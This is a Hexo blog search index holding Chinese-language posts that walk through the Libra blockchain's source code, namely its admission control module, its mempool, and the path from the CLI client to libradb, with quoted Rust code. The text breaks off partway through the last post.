<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[blockchain]]></title>
    <url>%2F2019%2F07%2F08%2Fblockchain%2F</url>
    <content type="text"></content>
      <categories>
        <category>区块链</category>
        <category>以太坊</category>
      </categories>
      <tags>
        <tag>杂七杂八</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[bc.md]]></title>
    <url>%2F2019%2F07%2F08%2Fbc-md%2F</url>
    <content type="text"></content>
      <categories>
        <category>共识机制</category>
      </categories>
      <tags>
        <tag>区块链</tag>
        <tag>以太坊</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[测试博客]]></title>
    <url>%2F2019%2F07%2F04%2Ftest%2F</url>
    <content type="text"><![CDATA[测试文章，欢迎关注博客地址[1]: https://yp945.github.io]]></content>
      <categories>
        <category>杂文</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2019%2F07%2F04%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
  <entry>
    <title><![CDATA[Libra 源码分析：Libra 的准入控制(AC)模块]]></title>
    <url>%2F2019%2F07%2F02%2FAC-module%2F</url>
    <content type="text"><![CDATA[根据Libra的架构图，准入控制模块（AC：admission control，本文中简称AC模块）是位于验证器（Validator）与普通用户交互的入口。 准入控制参考 Libra文档-交易的生命周期 ，准入控制模块是验证器的唯一外部接口。 客户端向验证器发出的任何请求都会先转到AC，如图： 因此AC基本上就干了两件事，提供了两个接口.一个是SubmitTransaction，另一个是UpdateToLatestLedger. 主要代码位于admission_control_service\admission_control_service.rs 这个是对admission_control.proto的service AdmissionControl的实现。 SubmitTransaction这个模块主要是接受来自普通用户的Tx，如果合理有效则提交给MemPool模块，最终会进入到block中。工作流程: 校验Tx，包括三个部分一个是签名是否有效，另一个则是gas是否有效，第三个则是执行Tx中的code是否能够通过。 校验账户余额是否足够，然后通过grpc链接发送给mempool模块 将mempool结果返回给用户 需要说明的是Libra官方文档与代码并不完全相符，实际上校验Tx都是在VMValidator1中进行的。 相关代码都不在AC模块 相关代码简单分析12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970/// Validate transaction signature, then via VM, and add it to Mempool if it passes VM check. /// 流程非常简单 /// 1. 交由本地validator验证Tx执行能否通过,如果不通过报错,否则继续2 /// 2. 获取账户最新状态,组装`AddTransactionWithValidationRequest` /// 3. 调用mempool grpc接口,添加Tx到mempool中 pub(crate) fn submit_transaction_inner( &amp;self, req: SubmitTransactionRequest, ) -&gt; Result&lt;SubmitTransactionResponse&gt; &#123; // 就是校验mempool服务是否正常 if !self.can_send_txn_to_mempool()? &#123; debug!("Mempool is full"); OP_COUNTERS.inc_by("submit_txn.rejected.mempool_full", 1); let mut response = SubmitTransactionResponse::new(); response.set_mempool_status(MempoolIsFull); return Ok(response); &#125; let signed_txn_proto = req.get_signed_txn(); //利用`FromProto`这个trait将grpc 类型转换为内部类型. let signed_txn = match SignedTransaction::from_proto(signed_txn_proto.clone()) &#123; Ok(t) =&gt; t, Err(e) =&gt; &#123; security_log(SecurityEvent::InvalidTransactionAC) .error(&amp;e) .data(&amp;signed_txn_proto) .log(); let mut response = SubmitTransactionResponse::new(); response.set_ac_status(AdmissionControlStatus::Rejected); OP_COUNTERS.inc_by("submit_txn.rejected.invalid_txn", 1); return Ok(response); &#125; &#125;; //交由vm_validator校验Tx是否合法.实际对应的是`VMValidator`这个struct //签名校验是否有效实际上是在vm_validator中. let gas_cost = signed_txn.max_gas_amount(); let validation_status = self .vm_validator .validate_transaction(signed_txn.clone()) .wait() .map_err(|e| &#123; security_log(SecurityEvent::InvalidTransactionAC) .error(&amp;e) .data(&amp;signed_txn) .log(); e &#125;)?; //Validator验证Tx是否有效,注意该调用也是一个grpc调用,因此走的是异步,wait模式 if let Some(validation_status) = validation_status &#123; let mut response = SubmitTransactionResponse::new(); OP_COUNTERS.inc_by("submit_txn.vm_validation.failure", 1); debug!( "txn failed in vm validation, status: &#123;:?&#125;, txn: &#123;:?&#125;", validation_status, signed_txn ); response.set_vm_status(validation_status.into_proto()); return Ok(response); &#125; let sender = signed_txn.sender(); let account_state = block_on(get_account_state(self.storage_read_client.clone(), sender)); let mut add_transaction_request = AddTransactionWithValidationRequest::new(); add_transaction_request.signed_txn = req.signed_txn.clone(); add_transaction_request.set_max_gas_cost(gas_cost); if let Ok((sequence_number, balance)) = account_state &#123; add_transaction_request.set_account_balance(balance); add_transaction_request.set_latest_sequence_number(sequence_number); &#125; //这个函数非常简单,就是调用mempool的grpc接口`add_transaction_with_validation` 来试图添加一个Tx到mempool中去 self.add_txn_to_mempool(add_transaction_request) &#125; UpdateToLatestLedgerAC的另一个功能就是提供查询功能，这个包括账户状态，交易，ContractEvent等的查询。 这实际上可以看做libra所有对外能够提供的服务了。 请求参数主要有四类请求，深刻理解了这四类请求的所有数据结构，基本上就掌握了如何使用libra了。 1234567891011121314151617181920212223#[derive(Arbitrary, Clone, Debug, Eq, PartialEq)]pub enum RequestItem &#123; GetAccountTransactionBySequenceNumber &#123; account: AccountAddress, sequence_number: u64, fetch_events: bool, &#125;, // this can't be the first variant, tracked here https://github.com/AltSysrq/proptest/issues/141 GetAccountState &#123; address: AccountAddress, &#125;, GetEventsByEventAccessPath &#123; access_path: AccessPath, start_event_seq_num: u64, ascending: bool, limit: u64, &#125;, GetTransactions &#123; start_version: Version, limit: u64, fetch_events: bool, &#125;,&#125; 从这些请求里面没有看到任何block相关字样，这也说明了libra有意弱化block概念，直接针对的是transaction。 返回结果请求和返回都位于types/src/get_with_proof.rs， types/src目录下就是系统的核心数据结构所在。如果能够把这里面的数据结构都理解透了，理解整个libra不在话下啊。 1234567891011121314151617181920#[allow(clippy::large_enum_variant)]#[derive(Arbitrary, Clone, Debug, Eq, PartialEq)]pub enum ResponseItem &#123; GetAccountTransactionBySequenceNumber &#123; signed_transaction_with_proof: Option&lt;SignedTransactionWithProof&gt;, proof_of_current_sequence_number: Option&lt;AccountStateWithProof&gt;, &#125;, // this can&apos;t be the first variant, tracked here https://github.com/AltSysrq/proptest/issues/141 GetAccountState &#123; account_state_with_proof: AccountStateWithProof, &#125;, GetEventsByEventAccessPath &#123; events_with_proof: Vec&lt;EventWithProof&gt;, proof_of_latest_event: Option&lt;AccountStateWithProof&gt;, &#125;, GetTransactions &#123; txn_list_with_proof: TransactionListWithProof, &#125;,&#125; 具体实现实现非常简单，实际上就是一个请求转达，是直接调用的storage模块的grpc服务，所以阅读storage模块相关文章即可，参考：打通Libra CLI客户端与libradb模块, Libra 中数据存储的 Schema。 12345678910111213141516/// Pass the UpdateToLatestLedgerRequest to Storage for read query. fn update_to_latest_ledger_inner( &amp;self, req: UpdateToLatestLedgerRequest, ) -&gt; Result&lt;UpdateToLatestLedgerResponse&gt; &#123; let rust_req = types::get_with_proof::UpdateToLatestLedgerRequest::from_proto(req)?; let (response_items, ledger_info_with_sigs, validator_change_events) = self .storage_read_client .update_to_latest_ledger(rust_req.client_known_version, rust_req.requested_items)?; let rust_resp = types::get_with_proof::UpdateToLatestLedgerResponse::new( response_items, ledger_info_with_sigs, validator_change_events, ); //直接读取本地数据库,注意这个接口是查询而不是更新 Ok(rust_resp.into_proto()) &#125; 启动流程AC模块是一个独立的grpc服务，也是一个独立的可执行程序。入口处位于main.rs。这里简单分析一下启动流程 main.rs1234567891011121314/// Run a Admission Control service in its own process./// It will also setup global logger and initialize config.fn main() &#123; let (config, _logger, _args) = setup_executable( "Libra AdmissionControl node".to_string(), vec![ARG_PEER_ID, ARG_CONFIG_PATH, ARG_DISABLE_LOGGING], ); let admission_control_node = admission_control_node::AdmissionControlNode::new(config); admission_control_node .run() .expect("Unable to run AdmissionControl node");&#125; 首先核心是使用setup_executable来解析参数，获取系统配置以及日志。 这个函数做整个libra所有的服务中都是这么使用的。 AdmissionControlNode第二步则是创建AdmissionControlNode 123456/// Struct to run Admission Control service in a dedicated process. It will be used to spin up/// extra AC instances to talk to the same validator.pub struct AdmissionControlNode &#123; /// Config used to setup environment for this Admission Control service instance. node_config: NodeConfig,&#125; 从定义中无法直接看出依赖，在run函数中可以看出启动过程。 1234567891011121314151617181920212223242526272829303132/// Setup environment and start a new Admission Control service. pub fn run(&amp;self) -&gt; Result&lt;()&gt; &#123; logger::set_global_log_collector( self.node_config .log_collector .get_log_collector_type() .unwrap(), self.node_config.log_collector.is_async, self.node_config.log_collector.chan_size, ); info!("Starting AdmissionControl node",); // Start receiving requests let client_env = Arc::new(EnvBuilder::new().name_prefix("grpc-ac-mem-").build()); let mempool_connection_str = format!( "&#123;&#125;:&#123;&#125;", self.node_config.mempool.address, self.node_config.mempool.mempool_service_port ); let mempool_channel = ChannelBuilder::new(client_env.clone()).connect(&amp;mempool_connection_str); self.run_with_clients( client_env.clone(), //依赖两个服务,一个是mempool服务 Arc::new(MempoolClient::new(mempool_channel)), //另一个是storage服务,正如我们上面的分析 Some(Arc::new(StorageReadServiceClient::new( Arc::clone(&amp;client_env), &amp;self.node_config.storage.address, self.node_config.storage.port, ))), ) &#125; 实际上在run_with_clients中还创建了vm_validator，只不过这个不是独立的服务罢了。通过run_with_clients我们也可以学习构建grpc服务的流程。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768/// This method will start a node using the provided clients to external services. /// For now, mempool is a mandatory argument, and storage is Option. If it doesn't exist, /// it'll be generated before starting the node. pub fn run_with_clients&lt;M: MempoolClientTrait + 'static&gt;( /* 若是有where T：'static 的约束，意思则是，类型T⾥⾯不包含任何指向短⽣命周期的借⽤指针， 意思是要么完全不包含任何借⽤，要么可以有指向'static的借⽤指针。 */ &amp;self, env: Arc&lt;Environment&gt;, mp_client: Arc&lt;M&gt;, storage_client: Option&lt;Arc&lt;StorageReadServiceClient&gt;&gt;, /* storage_client是和后端的storage服务进行通信 libra实现的各个服务之间都是通过grpc服务交互*/ ) -&gt; Result&lt;()&gt; &#123; // create storage client if doesn't exist let storage_client: Arc&lt;dyn StorageRead&gt; = match storage_client &#123; Some(c) =&gt; c, None =&gt; Arc::new(StorageReadServiceClient::new( env, &amp;self.node_config.storage.address, self.node_config.storage.port, )), &#125;; let vm_validator = Arc::new(VMValidator::new(&amp;self.node_config, storage_client.clone())); let handle = AdmissionControlService::new( mp_client, storage_client, vm_validator, self.node_config .admission_control .need_to_check_mempool_before_validation, ); let service = admission_control_grpc::create_admission_control(handle); let _ac_service_handle = spawn_service_thread( service, self.node_config.admission_control.address.clone(), self.node_config .admission_control .admission_control_service_port, "admission_control", ); //这个debug服务与我们说的上述内容无关,纯粹是为了调试需要. // Start Debug interface let debug_service = node_debug_interface_grpc::create_node_debug_interface(NodeDebugService::new()); let _debug_handle = spawn_service_thread( debug_service, self.node_config.admission_control.address.clone(), self.node_config .debug_interface .admission_control_node_debug_port, "debug_service", ); info!( "Started AdmissionControl node on port &#123;&#125;", self.node_config .admission_control .admission_control_service_port ); loop &#123; thread::park(); &#125; &#125; 本文作者为深入浅出共建者：白振轩，欢迎大家关注他的博客 。 深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博。]]></content>
      <categories>
        <category>Libra</category>
      </categories>
      <tags>
        <tag>Libra源码分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[libra的mempool模块解读-1]]></title>
    <url>%2F2019%2F07%2F01%2FInterpretation-of-libra-mempool-module1%2F</url>
    <content type="text"><![CDATA[Mempool模块主要用于缓存未打包的合法交易,该模块和比特币,以太坊源码中的TxPool功能等价,只要包含两个功能: 1.接收本地收到的Tx并验证2.和其他节点之间互相同步Tx.因为Libra使用的是不会分叉的PBFT共识,所以缓冲池的实现以及管理要简单许多. 基本功能mempool的功能主要是接收来自AC模块的交易,同时和其他节点之间通过网络同步交易.mempool主要用于保存可能打包的交易,主要是指验证合法的交易(包括签名合法,账户金额足够). 可以简单分类: 1.各方面都齐备,可以进入下一块的交易. 主要是seq_number连起来的.2.因为seq_number没有连续不能被打包的交易 (比如当前AccountA的Tx中包含了[2,3,4,7,8]交易,但是5没有,所以[7,8]是不可能被打包的) 同时libra中也有和以太坊一样的GasPrice概念(功能也一样),因此如果对于同一账号,seq_number相同的情况下,会选择GasPrice高的那个Tx.根据以上讨论,可以看出实际上Libra唯一的ID可以不认为是交易数据的哈希值,可以把(Address,seq_number)作为唯一的ID,当然这个在比特币以太坊等公链中也行的通.因为在Libra中把(Address,seq_number)二元组作为Tx唯一的ID,所以其代码设计中对于Tx的管理和以太坊也不太一样. 那么什么是mempool呢?可以通俗的认为就是一个HashMap &lt;AccountAddress, BTreeMap&lt;u64, MempoolTransaction&gt;&gt;, 其中这里的u64就是对应账户的seq_number.其所有功能都是围绕着这个数据结构展开. mempool的对外接口12345678910pub trait Mempool &#123; //主要用于接受来自AC的新增Tx fn add_transaction_with_validation(&amp;mut self, ctx: ::grpcio::RpcContext, req: super::mempool::AddTransactionWithValidationRequest, sink: ::grpcio::UnarySink&lt;super::mempool::AddTransactionWithValidationResponse&gt;); //服务于consensus模块,从mempool中获取下一块可以打包的交易 fn get_block(&amp;mut self, ctx: ::grpcio::RpcContext, req: super::mempool::GetBlockRequest, sink: ::grpcio::UnarySink&lt;super::mempool::GetBlockResponse&gt;); //服务于consensus模块,当交易被打包以后,缓存的相关Tx就可以移除了. fn commit_transactions(&amp;mut self, ctx: ::grpcio::RpcContext, req: super::mempool::CommitTransactionsRequest, sink: ::grpcio::UnarySink&lt;super::mempool::CommitTransactionsResponse&gt;); //健康检查,主要是检查缓冲区是否放得下更多Tx fn health_check(&amp;mut self, ctx: ::grpcio::RpcContext, req: super::mempool::HealthCheckRequest, sink: ::grpcio::UnarySink&lt;super::mempool::HealthCheckResponse&gt;);&#125; MempoolService的实现位于mempool/src/mempool_service.rs,这里的实现就是对于grpc接口数据的处理,真正的处理逻辑位于CoreMempool 12345678910111213141516171819202122232425262728293031323334353637383940414243#[derive(Clone)]pub(crate) struct MempoolService &#123; pub(crate) core_mempool: Arc&lt;Mutex&lt;CoreMempool&gt;&gt;,&#125;pub struct Mempool &#123; // stores metadata of all transactions in mempool (of all states) transactions: TransactionStore, //这是系统的核心 sequence_number_cache: LruCache&lt;AccountAddress, u64&gt;, //这里保存的是AccountAddress对应的下一个可以打包的Tx对应的seq_number // temporary DS. TODO: eventually retire it // for each transaction, entry with timestamp is added when transaction enters mempool // used to measure e2e latency of transaction in system, as well as time it takes to pick it up // by consensus metrics_cache: TtlCache&lt;(AccountAddress, u64), i64&gt;, //这个是为了 //一个交易在缓冲池中不能呆的太久,如果迟迟不能被打包会被定期清理掉.这个时间就是其在缓冲池中呆的最长时间 pub system_transaction_timeout: Duration,&#125;/// TransactionStore is in-memory storage for all transactions in mempoolpub struct TransactionStore &#123; // main DS transactions: HashMap&lt;AccountAddress, AccountTransactions&gt;, /* 地址=&gt;&#123;seq=&gt;Tx&#125; 二重map,所有收集到的合法的Tx */ // indexes priority_index: PriorityIndex, /* 按照gas_price,expiration_time,address, * sequence_number顺序排序的所有可以打包的Tx */ // TTLIndex based on client-specified expiration time expiration_time_index: TTLIndex, /* 这个过期时间是用户提交的,这个时间虽然是Duration, * 但是其实也是绝对时间,保存所有合法的Tx */ // TTLIndex based on system expiration time // we keep it separate from `expiration_time_index` so Mempool can&apos;t be clogged // by old transactions even if it hasn&apos;t received commit callbacks for a while system_ttl_index: TTLIndex, /* 这个时间是由mempool控制, * 在进入缓冲池的时候会设置成当时的时间加上过期时间, * 保存所有的合法Tx */ timeline_index: TimelineIndex, /* 里面保存的timeline_id,用于mempool之间的Tx同步, * 这里面按序保存着可以打包的Tx */ // keeps track of &quot;non-ready&quot; txns (transactions that can&apos;t be included in next block) parking_lot_index: ParkingLotIndex, //暂时不满足条件,不能打包的Tx // configuration capacity: usize, capacity_per_user: usize,&#125; 接受新的Tx在add_transaction_with_validation中只是简单解析一下参数就很快进入到CoreMempool的add_txn中,我们重点解析一下这个函数. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152/// Used to add a transaction to the Mempool /// Performs basic validation: checks account&apos;s balance and sequence number pub(crate) fn add_txn( &amp;mut self, txn: SignedTransaction, gas_amount: u64, db_sequence_number: u64, //已经确认的txn&apos;s sender的seq_number balance: u64,//这个账户的金额 timeline_state: TimelineState, ) -&gt; MempoolAddTransactionStatus &#123; debug!( &quot;[Mempool] Adding transaction to mempool: &#123;&#125;:&#123;&#125;&quot;, &amp;txn.sender(), db_sequence_number ); println!(&quot;signedTransaction:&#123;:?&#125;&quot;, txn); //账户余额都不够付gas费了,直接护额略 if !self.check_balance(&amp;txn, balance, gas_amount) &#123; return MempoolAddTransactionStatus::InsufficientBalance; &#125; let cached_value = self.sequence_number_cache.get_mut(&amp;txn.sender()); let sequence_number = match cached_value &#123; Some(value) =&gt; max(*value, db_sequence_number), None =&gt; db_sequence_number, &#125;; self.sequence_number_cache .insert(txn.sender(), sequence_number); //可能sequence_number需要更新了. 如果发生了expiration呢? // don&apos;t accept old transactions (e.g. seq is less than account&apos;s current seq_number) if txn.sequence_number() &lt; sequence_number &#123; return MempoolAddTransactionStatus::InvalidSeqNumber; &#125; //交易在缓冲池中的过期时间 let expiration_time = SystemTime::now() .duration_since(UNIX_EPOCH) .expect(&quot;init timestamp failure&quot;) + self.system_transaction_timeout; self.metrics_cache.insert( (txn.sender(), txn.sequence_number()), Utc::now().timestamp_millis(), Duration::from_secs(100), ); //MempoolTransaction指的就是在缓冲池中的Tx,为了缓冲池管理方便,增添了过期时间以及TimelineState,还有gasAmount, //主要是为了索引 let txn_info = MempoolTransaction::new(txn, expiration_time, gas_amount, timeline_state); //真正的Tx,无论能否立即被打包,都在TransactionStore中保存着 let status = self.transactions.insert(txn_info, sequence_number); OP_COUNTERS.inc(&amp;format!(&quot;insert.&#123;:?&#125;&quot;, status)); status &#125; remove_transaction 移除已打包交易1234567891011121314151617181920212223242526272829303132333435/// This function will be called once the transaction has been stored /// 共识模块确定Tx被打包了,那么缓冲池中的Tx就可以移除了. is_rejected表示没有被打包 /// 同时is_rejected为false的时候,sequence_number也告诉mempool目前sender之前的Tx都被打包了, /// 本地的seqence_number也要更新到这里了 pub(crate) fn remove_transaction( &amp;mut self, sender: &amp;AccountAddress, sequence_number: u64, is_rejected: bool, ) &#123; debug!( &quot;[Mempool] Removing transaction from mempool: &#123;&#125;:&#123;&#125;&quot;, sender, sequence_number ); self.log_latency(sender.clone(), sequence_number, &quot;e2e.latency&quot;); self.metrics_cache.remove(&amp;(*sender, sequence_number)); // update current cached sequence number for account let cached_value = self .sequence_number_cache .remove(sender) .unwrap_or_default(); let new_sequence_number = if is_rejected &#123; min(sequence_number, cached_value) &#125; else &#123; max(cached_value, sequence_number + 1) &#125;; //sequence_number_cache保存的就是下一个有效的seq_number self.sequence_number_cache .insert(sender.clone(), new_sequence_number); //核心处理其实还在`TransactionStore`中 self.transactions .commit_transaction(&amp;sender, sequence_number); &#125; 为consensus模块提供下一块交易数据get_block功能非常简单,就是跳出来下一块可以打包的交易,主要就是seq_number连起来的交易.因为不合法的交易早就已经被踢了. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879/// Fetches next block of transactions for consensus /// `batch_size` - size of requested block /// `seen_txns` - transactions that were sent to Consensus but were not committed yet /// Mempool should filter out such transactions /// 共识模块需要从mempool中拉取下一个块可用的Tx集合 pub(crate) fn get_block( &amp;mut self, batch_size: u64, mut seen: HashSet&lt;TxnPointer&gt;, ) -&gt; Vec&lt;SignedTransaction&gt; &#123; /* get_block 实际上是找寻可以进入下一块的交易: 1. 已经送到共识模块中,但是还没有确认(确认后会从缓冲池中移除) 2. 这个Tx的seq刚好就是下一个可以打包的.比如上一块中AccountA的seq是3,那么现在seq=4的Tx就可以进入block 3. 或者当前块中已经包含了seq=4的,那么seq=5的就可以进入 */ let mut result = vec![]; // Helper DS. Helps to mitigate scenarios where account submits several transactions // with increasing gas price (e.g. user submits transactions with sequence number 1, 2 // and gas_price 1, 10 respectively) // Later txn has higher gas price and will be observed first in priority index iterator, // but can&apos;t be executed before first txn. Once observed, such txn will be saved in // `skipped` DS and rechecked once it&apos;s ancestor becomes available let mut skipped = HashSet::new(); // iterate over the queue of transactions based on gas price //带标签的break用法 &apos;main: for txn in self.transactions.iter_queue() &#123; if seen.contains(&amp;TxnPointer::from(txn)) &#123; continue; &#125; let mut seq = txn.sequence_number; /* 这里打包是按照地址选,尽可能的把同一个地址的Tx都打包到一个block中去 */ let account_sequence_number = self.sequence_number_cache.get_mut(&amp;txn.address); let seen_previous = seq &gt; 0 &amp;&amp; seen.contains(&amp;(txn.address, seq - 1)); // include transaction if it&apos;s &quot;next&quot; for given account or // we&apos;ve already sent its ancestor to Consensus if seen_previous || account_sequence_number == Some(&amp;mut seq) &#123; let ptr = TxnPointer::from(txn); seen.insert(ptr); result.push(ptr); if (result.len() as u64) == batch_size &#123; //batch_size表示这块最多有多少个交易 break; &#125; // check if we can now include some transactions // that were skipped before for given account //这是回头遍历,比如先走过了seq=7的,那么发现seq=6合适的时候,就还可以再把seq=7加入 let mut skipped_txn = (txn.address, seq + 1); while skipped.contains(&amp;skipped_txn) &#123; seen.insert(skipped_txn); result.push(skipped_txn); if (result.len() as u64) == batch_size &#123; break &apos;main; &#125; skipped_txn = (txn.address, skipped_txn.1 + 1); &#125; &#125; else &#123; skipped.insert(TxnPointer::from(txn)); &#125; &#125; // convert transaction pointers to real values let block: Vec&lt;_&gt; = result .into_iter() //filter_map 行为等于filter &amp; map .filter_map(|(address, seq)| self.transactions.get(&amp;address, seq)) .collect(); for transaction in &amp;block &#123; self.log_latency( transaction.sender(), transaction.sequence_number(), &quot;txn_pre_consensus_ms&quot;, ); &#125; block //就是一个Tx的集合,没有任何附加信息 &#125; 其他几个函数gc_by_system_ttl: 就是为了清除在mempool中呆的太久的交易,否则mempool因为空间已满而无法进来有效的交易gc_by_expiration_time: 是在新的一块来临的时候,依据新块时间可以非常确定那些用户指定的在这个之前必须打包的交易必须被清理掉,因为再也不可能被打包了.read_timeline: 主要用于节点间mempool中的Tx同步用,就是为每一个Tx都给一个本地唯一的单增的编号,这样推送的时候就知道推送到哪里了,避免重复. 下一篇我会讲解TransactionStore,他是维护mempool中Tx的核心数据结构.原文链接-libra的mempool模块解读-1]]></content>
      <categories>
        <category>Libra</category>
      </categories>
      <tags>
        <tag>Libra源码分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Libra 源码分析：打通Libra CLI客户端与libradb模块]]></title>
    <url>%2F2019%2F07%2F01%2FProficient-client-and-libradb-modules%2F</url>
    <content type="text"><![CDATA[这篇文章目的是打通Libra CLI 命令行工具与底层数据库模块libradb之间的关系 Libra Cli指的是 Libra上的第一笔交易 中提到的命令行工具。 libradb 指的是storage/libradb模块 。 Libra CLI客户端实现Libra CLI 客户端本身主要提供了 account， transfer 和 query 三个命令，其中每个命令还有若干子命令。这些命令中除了transfer是修改账本以外，其他都是直接查询的账本数据库。 一个具体例子这里就绕开CLI 客户端模块的枝枝蔓蔓，直接关注它最核心的部分。 我们找一个具体的子命令，追踪他的执行，然后看看他是怎么实现的。 account create 命令对应的就是 AccountCommandCreate 这个结构体，当我们敲下回车，在参数解析完毕以后就会进入execute函数。 1. execute1fn execute(&amp;self, client: &amp;mut ClientProxy, _params: &amp;[&amp;str]) 第一个参数可以忽略，没有任何内容，第二个client是一个grpc client，就是与服务器的链接。_params则是空了，因为我们没有任何附加参数了。这个函数会直接调用ClientProxy.create_next_account ClientProxy.create_next_account 调用 wallet.new_address 获取新的地址， 这里的Wallet使用的是WalletLibrary，这个钱包中的私钥生成以及管理机制和比特币中的BIP32原理是完全一样，只是细节稍微不同。 我会在其他文章专门介绍钱包的实现。 调用get_account_data_from_address从服务器上获取该新生成地址的账户信息。rust fn get_account_data_from_address( client: &amp;GRPCClient, address: AccountAddress, key_pair: Option&lt;KeyPair&gt;, ) -&gt; Result&lt;AccountData&gt;这个函数很简单就是调用get_account_blob然后对返回的信息封装成AccountData。 调用GRPCClient的get_account_blob 获取AccountStateBlob以及Version信息 12345678910pub(crate) fn get_account_blob( &amp;self, address: AccountAddress,) -&gt; Result&lt;(Option&lt;AccountStateBlob&gt;, Version)&gt;&#123; let req_item = RequestItem::GetAccountState &#123; address &#125;; let mut response = self.get_with_proof_sync(vec![req_item])?; ...//处理返回结果&#125; 这个函数组装请求参数GetAccountState，然后就是调用get_with_proof_sync然后解码response。 调用GRPCClient的get_with_proof_sync 1234pub(crate) fn get_with_proof_sync( &amp;self, requested_items: Vec&lt;RequestItem&gt;,) -&gt; Result&lt;UpdateToLatestLedgerResponse&gt; 这个函数功能非常简单，就是调用get_with_proof_async，将异步转换为同步，同时会多次尝试。具体代码也很简单就是一句话: 12let mut resp: Result&lt;UpdateToLatestLedgerResponse&gt; = self.get_with_proof_async(requested_items.clone())?.wait(); 这里其实也体现了怎么使用future库。 GRPCClient.get_with_proof_async 1234fn get_with_proof_async( &amp;self, requested_items: Vec&lt;RequestItem&gt;,) -&gt; Result&lt;impl Future&lt;Item = UpdateToLatestLedgerResponse, Error = failure::Error&gt;&gt; 这个函数做了两件事,一个是调用update_to_latest_ledger_async_opt发出请求,然后对结果进行验证,如果符合要求(主要是指validator的签名是否正确以及足够数量)。update_to_latest_ledger_async_opt是一个protobuf自动生成的函数,可以直接忽略。 服务端处理 客户端的请求发出以后，服务端处理代码位于storage\storage_service中 123456789101112impl Storage for StorageService &#123;fn update_to_latest_ledger( &amp;mut self, ctx: grpcio::RpcContext&lt;'_&gt;, req: UpdateToLatestLedgerRequest, sink: grpcio::UnarySink&lt;UpdateToLatestLedgerResponse&gt;,) &#123; debug!("[GRPC] Storage::update_to_latest_ledger"); let _timer = SVC_COUNTERS.req(&amp;ctx); let resp = self.update_to_latest_ledger_inner(req); provide_grpc_response(resp, ctx, sink);&#125; 其中的update_to_latest_ledger_inner简单处理以后就会走到storage\libradb\lib.rs中的update_to_latest_ledger。 libradb所有libra中需要持久化存储的数据入口都在这里。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364/// This holds a handle to the underlying DB responsible for physical storage and provides APIs for/// access to the core Libra data structures.pub struct LibraDB &#123; db: Arc&lt;DB&gt;, ledger_store: LedgerStore, transaction_store: TransactionStore, state_store: StateStore, event_store: EventStore,&#125;impl LibraDB &#123; /// This creates an empty LibraDB instance on disk or opens one if it already exists. pub fn new&lt;P: AsRef&lt;Path&gt; + Clone&gt;(db_root_path: P) -&gt; Self /// Persist transactions. Called by the executor module when either syncing nodes or committing /// blocks during normal operation. /// /// When `ledger_info_with_sigs` is provided, verify that the transaction accumulator root hash /// it carries is generated after the `txns_to_commit` are applied. pub fn save_transactions( &amp;self, txns_to_commit: &amp;[TransactionToCommit], first_version: Version, ledger_info_with_sigs: &amp;Option&lt;LedgerInfoWithSignatures&gt;, ) -&gt; Result&lt;()&gt; ; /// This backs the `UpdateToLatestLedger` public read API which returns the latest /// [`LedgerInfoWithSignatures`] together with items requested and proofs relative to the same /// ledger info. pub fn update_to_latest_ledger( &amp;self, _client_known_version: u64, request_items: Vec&lt;RequestItem&gt;, ) -&gt; Result&lt;( Vec&lt;ResponseItem&gt;, LedgerInfoWithSignatures, Vec&lt;ValidatorChangeEventWithProof&gt;, )&gt; /// Gets an account state by account address, out of the ledger state indicated by the state /// Merkle tree root hash. /// /// This is used by the executor module internally. pub fn get_account_state_with_proof_by_state_root( &amp;self, address: AccountAddress, state_root: HashValue, ) -&gt; Result&lt;(Option&lt;AccountStateBlob&gt;, SparseMerkleProof)&gt;; /// Gets information needed from storage during the startup of the executor module. /// /// This is used by the executor module internally. pub fn get_executor_startup_info(&amp;self) -&gt; Result&lt;Option&lt;ExecutorStartupInfo&gt;&gt;; /// Gets a batch of transactions for the purpose of synchronizing state to another node. /// /// This is used by the State Synchronizer module internally. pub fn get_transactions( &amp;self, start_version: Version, limit: u64, ledger_version: Version, fetch_events: bool, ) -&gt; Result&lt;TransactionListWithProof&gt;; LibraDB只提供了有限的几个公共函数, save_transactions这是共识模块达成共识以后，生成了新的 block，需要将这些Tx存储到账本中。从参数中可以看出他既包含了Tx也包含了这些Tx的相关证明(Validator的签名)。 get_account_state_with_proof_by_state_root用来查询账户在指定Merkle树下的状态. get_executor_startup_info这个是executor内部使用. get_transactions这个是Synchronizer内部使用 update_to_latest_ledger这个函数式我们重点分析的对象。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647/// This backs the `UpdateToLatestLedger` public read API which returns the latest /// [`LedgerInfoWithSignatures`] together with items requested and proofs relative to the same /// ledger info. pub fn update_to_latest_ledger( &amp;self, _client_known_version: u64, request_items: Vec&lt;RequestItem&gt;, ) -&gt; Result&lt;( Vec&lt;ResponseItem&gt;, LedgerInfoWithSignatures, Vec&lt;ValidatorChangeEventWithProof&gt;, )&gt; &#123; ... // Fulfill all request items let response_items = request_items .into_iter() .map(|request_item| match request_item &#123; RequestItem::GetAccountState &#123; address &#125; =&gt; Ok(ResponseItem::GetAccountState &#123; ... //处理GetAccountState请求 query balance|sequence|account_state等命令 &#125;), RequestItem::GetAccountTransactionBySequenceNumber &#123; account, sequence_number, fetch_events, &#125; =&gt; &#123; ... //处理GetAccountTransactionBySequenceNumber请求 query txn_acc_seq命令 &#125; RequestItem::GetEventsByEventAccessPath 